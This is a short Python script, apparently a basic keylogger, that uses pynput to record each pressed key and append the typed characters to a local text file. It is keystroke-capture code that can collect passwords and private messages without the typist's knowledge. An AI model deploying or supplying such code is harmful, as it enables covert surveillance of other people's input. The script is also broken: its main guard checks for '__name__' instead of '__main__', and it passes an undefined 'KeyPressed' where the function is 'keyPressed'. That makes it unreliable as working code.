from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


if __name__ == "__name__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()

